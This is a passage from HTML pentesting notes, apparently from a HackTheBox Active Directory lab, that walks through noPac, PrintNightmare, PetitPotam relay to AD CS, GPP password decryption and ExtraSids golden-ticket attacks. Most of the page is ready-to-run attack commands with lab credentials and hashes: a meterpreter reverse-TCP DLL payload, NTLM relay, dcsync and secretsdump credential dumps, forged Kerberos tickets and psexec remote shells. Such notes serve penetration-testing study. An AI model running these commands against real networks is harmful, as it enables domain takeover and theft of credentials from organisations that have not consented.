                <p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller's SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC's name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name</p>
                <ul>
                    <h3>Steps to perform</h3>
                    <p>First we need to scan the target in order to se if its vulnerable. Use the scanner.py provided in the repo</p>
                    <pre><code class="language-bash">python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5</code></pre>
                    <p>In case we see the following it is likely to be vulnerable. Have in mind that in the Machine Quota is 0 we won't be able to use this attack</p>
                    <pre><code class="language-bash">[*] Current ms-DS-MachineAccountQuota = 10
[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484
[*] Got TGT from 172.16.5.5. Ticket size 663</code></pre>
                    <p>Now exploiting part:</p>
                    <pre><code class="language-bash">python3 noPac.py inlanefreight.local/forend:Klmcargo2 
-dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></pre>    
                    <p>Now that the exploit succeed we can try with the following. Obiously you need a domain user and it's credentials. Then you'll get NTLM hash of admin account</p>
                    <pre><code class="language-bash">python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  
-dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</code></pre>
                    <p>Then you'll get a shell but you won't be able to get out of system32 folder. Even though the ticket from the administrator will be in our power so we can use it to connect</p>
                    <p><b>Remember to add the name of the host to th /etc/hosts in this case (ACADEMY-EA-DC01.inlanefreight.local) </b></p>
                    <pre><code class="language-bash">mv administrator_ACADEMY-EA-DC01.inlanefreight.local.ccache /tmp/admin.ccache</code></pre>
                    <pre><code class="language-bash">export KRB5CCNAME=/tmp/admin.ccache</code></pre>
                    <pre><code class="language-bash">psexec.py -k -no-pass INLANEFREIGHT.LOCAL/Administrator@ACADEMY-EA-DC01.inlanefreight.local</code></pre>
                </ul>
                   
                <h2 id="PrintNightmare">PrintNightmare</h2>
                <ul>
                    <p>A vulnerability found in the Print Spooler service that runs on all Windows operating systems, Clone the repo from <a class="notion-link" href="https://github.com/cube0x0/CVE-2021-1675">CVE-2021-1675</a></p>
                    <p>Check if the server has the <b>Print System Asynchronous Protocol and Print System Remote Protocol exposed</b></p>  
                    <pre><code class="language-bash">rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'</code></pre>
                    <p>Exploitation</p>
                    <p>First generate the payload</p>
                    <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll</code></pre>
                    <p>Then open a smb server to host that payload</p>
                    <pre><code class="language-bash">impacket-smbserver share . -smb2support</code></pre>
                    <p>Then use exploit multi handler from msfconsole to capture the shell</p>
                    <pre><code class="language-bash">use exploit/multi/handler/ lhost 172.16.5.225 lport 8080</code></pre>
                    <p>Finally exploit it using the following command</p>
                    <pre><code class="language-bash">python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\share\backupscript.dll'</code></pre>
                </ul>

                <h2 id="PetitPotam">PetitPotam</h2>
                <ul>
                    <p>It is an NTLM authentication coercion technique that forces a Windows machine (often a Domain Controller) to authenticate to an attacker-controlled system without needing credentials. In summary the attack goes: The attacker remotely calls (EfsRpcOpenFileRaw) then the victim system attempts to access a UNC path: (\\ATTACKER\share\file) which Windows automatically authenticates using NTLM to finally allow the attacker top capture or relays that authentication</p>
                    <p>Turn on petit potam providing you attack address first and then the target adress</p>
                    <pre><code class="language-bash">python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></pre>
                    <p>Then start ntlmrelay.py and provide the following credentials</p>
                    <pre><code class="language-bash">sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController</code></pre>
                    <ul>
                        <p>In case you are doing this combined with ligolo you must use two listeners for the following ports (80,445) and the NTLM relay command must be</p>
                        <pre><code class="language-bash">impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController --http-port 80</code></pre>
                    </ul>
                    <p>This will generate a certificate in base64. Copy into a file and decode it</p>
                    <pre><code class="language-bash">cat certb64 | base64 -d > crt.pfx</code></pre>
                    <p>Now request a tgt with certificate used</p>
                    <pre><code class="language-bash">sudo python3 gettgtpkinit.py inlanefreight.local/ACADEMY-EA-DC01$ -cert-pfx /home/htb-student/crt.pfx out.ccache</code></pre>
                    <p>Export the ticket</p>
                    <pre><code class="language-bash"> export KRB5CCNAME=/tmp/out.ccache</code></pre>
                    <p>Use the ticket to dump hashes</p>
                    <pre><code class="language-bash">sudo secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code></pre>
                </ul>

                <h2 id="Group Policy Preferences (GPP) Passwords">Group Policy Preferences (GPP) Passwords</h2>
                <ul>
                    <p>When a new GPP is created, an .xml file is created in the SYSVOL share. This xml will contain a credential for a user account. This is currently patched but you may find a share where .xml files are still in the SYSVOL directory.</p>
                    <p>Find users with GPP</p>
                    <pre><code class="language-bash">Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol</code></pre>
                    <p>To crack the password you need</p>
                    <pre><code class="language-bash">gpp-decrypt encrypted_password</code></pre>
                    <p>You can automate this process by using</p>
                    <pre><code class="language-bash">netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
netexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></pre>
                </ul>

                <h2 id="Attacking domain trusts">Attacking domain trusts</h2>
                <ul>
                    <p>Trusts can be set up in two directions: one-way or two-way (bidirectional).</p>
                    <p><b>One-way trust</b>: Users in a trusted domain can access resources in a trusting domain, not vice-versa.</p>
                    <p><b>Bidirectional trust</b>: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.</p>
                    <h3>Enumeration</h3>
                    <ul>
                        <p>List domain trusts</p>
                        <pre><code class="language-powershell">Get-DomainTrust </code></pre>
                        <p>Lists users from a domain</p>
                        <pre><code class="language-powershell">Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName</code></pre>
                        <b>Using bloodhound's query named Map Domain Trusts can also lists the domains trusts</b>
                    </ul>

                    <h3>ExtraSids Attack</h3>
                    <ul>
                    <p>If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.</p>
                    <p>SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.</p>
                    <p>SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain</p>
                    <p>To perform the attack we need the following:</p>
                    <h3>From windows</h3>
                    <ul>
                    <b>KRBTGT Account's NTLM Hash</b>
                    <p>We need to perform a dcsync or lsass dump</p>
                    <p>Using mimikatz...</p>
                    <pre><code class="language-powershell">mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></pre>
                    
                    <br>
                    <b>Domain SID</b>
                    <pre><code class="language-powershell">Get-DomainSID</code></pre>

                    <br>
                    <b>SID of the Admins grup</b>
                    <pre><code class="language-powershell">Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid</code></pre>
                    
                    <p>We can perform the attack using the mimikatz or rubeus. Remember that youll be creating a new user (in this case hacker)</p>
                    <b>mimikatz</b>
                    <ul>
                        <br>
                        <pre><code class="language-powershell">mimikatz # 
kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL 
/sid:SID_OF_CHILD_DOMAIN /krbtgt:9d765b482771505cbe97411065964d5f /sids:SID_OF_ADMINS_GROUP /ptt</code></pre>
                        <p>This will automatically export the ticket and youll be able to access directly to the DC since youll be in the Enterprise Admins group</p>
                    </ul>    

                    <b>Rubeus</b>
                    <ul>
                        <br>
                        <pre><code class="language-powershell">.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f 
/domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:SID_OF_CHILD_DOMAIN  /sids:SID_OF_ADMINS_GROUP /user:hacker /ptt</code></pre>
                        <p>This will automatically export the ticket and youll be able to access directly to the DC since youll be in the Enterprise Admins group</p>
                    </ul> 

                    <p>Once done you can try to access the domain by doing</p>
                    <pre><code class="language-powershell">ls \\academy-ea-dc01.inlanefreight.local\c$</code></pre>
                    <p>And most important we can perform another dcsync to the DC, remember always to specify the domain since it won't work if not</p>
                    <pre><code class="language-powershell">lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL</code></pre>
                    </ul>
                    <h3>From linux</h3>
                    <ul>
                        <p>KRBTGT Account's NTLM Hash</p>
                        <p>Obviusly you need domain admin on that server</p>
                        <pre><code class="language-bash">secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></pre>
                        <br>

                        <b>Domain SID</b>
                        <pre><code class="language-bash">lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240</code></pre>

                        <b>SID of the Admins group</b>
                        <p>Think that the Enterpise Admins group is only in the root domain so from child domains you won't be able to get it. It is recommended to get it from Windows or by using rpcclient</p>
                        <p>In case your credentials are not valid in the DC you won't be able to login</p>
                        <pre><code class="language-bash">ldapsearch -x -H ldap://logistics.inlanefreight.local 
-D "htb-student_adm@logistics.inlanefreight.local" -w HTB_@cademy_stdnt_admin! 
-b "dc=logistics,dc=inlanefreight,dc=local" "(cn=Enterprise Admins)" objectSid</code></pre>
                        <p>Finally perform the attack using ticketer.py</p>
                        <pre><code class="language-bash">ticketer.py -nthash 9d765b482771505cbe97411065964d5f 
-domain-sid DOMAIN_SID -domain logistics.inlanefreight.local -extra-sid SID_OF_ADMINS_GROUP hacker
export KRB5CCNAME=/tmp/hacker.ccache
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5</code></pre>
                        <b>You can also use this atopwn tool to automate the attack</b>
                        <pre><code class="language-bash">raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm</code></pre>
                        <p>Since you won't be able to do something when you get the shell i recommend you to dump the NTDS.dit</p>
                        <pre><code class="language-bash">netexec smb 172.16.5.5 -u Administrator -H 88ad09182de639ccc6579eb0849751cf -M ntdsutil</code></pre>
                    </ul>
                    </ul>
                </ul>
            </ul>        
        </div>
    </div>
</div>
</body>
<script>
    function generateMenu() {
        const headers = document.querySelectorAll('.alternative-notion-container h2');
        const sidebarList = document.querySelector('#sidebar-menu');

        headers.forEach(header => {
            if (!header.id) return;

            // Texto original del encabezado
            const headerText = header.textContent.trim();

            // Texto que aparecer√° en el men√∫
            let menuText = headerText;

            // Excepci√≥n espec√≠fica
            if (headerText.toLowerCase() === 'post exploitation attacks / bloodhound related') {
            menuText = 'Post exploitation';
            }

            // Crear elementos del men√∫
            const listItem = document.createElement('li');
            const link = document.createElement('a');
            link.textContent = menuText;
            link.setAttribute('href', `#${header.id}`);

            listItem.appendChild(link);
            sidebarList.appendChild(listItem);
        });
}


    // Asegurarse de que ambas funciones se ejecuten despu√©s de que todo el contenido est√© listo
    window.addEventListener('load', generateMenu);
</script>
</html>